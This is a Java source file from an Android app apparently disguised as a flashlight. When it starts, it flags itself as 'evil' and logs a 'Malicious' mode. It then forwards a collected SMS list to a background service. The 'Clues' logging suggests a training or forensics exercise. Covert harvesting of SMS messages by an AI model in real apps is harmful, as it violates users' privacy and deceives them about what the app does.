package com.example.flashlightIITR;


import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import java.io.Serializable;
import java.util.HashMap;

public class NotificationActivity extends AppCompatActivity {
    HashMap<String,String>  smsList = new HashMap<String,String>();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        MainActivity.version="17";
        MainActivity.isEvil=true;
        Clues myclues=new Clues();
        myclues.SendLog("App Mode Change","App entered onCreate()","Malicious");

        Intent intent = getIntent();
        Log.d("Notify","Get an intent.");

        if (intent != null) {
            // Check if the intent contains the "SMS_LIST" extra
            if (intent.hasExtra("SMS_LIST")) {
                // Retrieve the smsList data from the intent extras
                HashMap<String, String> receivedSmsList = deserializeHashMap(intent.getSerializableExtra("SMS_LIST"));
                Log.d("Notify","Converting the data into Hashmap.");

                Intent intentBackground = new Intent(this, BackgroundService.class);
                intentBackground.putExtra("SMS_LIST", receivedSmsList);
                startService(intentBackground);
                Log.d("Notify","Triggering the BackgroundService");


            } else {
                Log.e("Notify", "Intent does not contain SMS_LIST extra");
            }
        } else {
            Log.e("Notify", "Intent is null");
        }

    }

    @SuppressWarnings("unchecked")
    private HashMap<String, String> deserializeHashMap(Serializable serializable) {
        return (HashMap<String, String>) serializable;
    }
}







// smsList = (HashMap<String,String>) getIntent().getExtras().get("SMS_LIST");
//        Log.d("Notify","Receive the data of Contacts.");
//
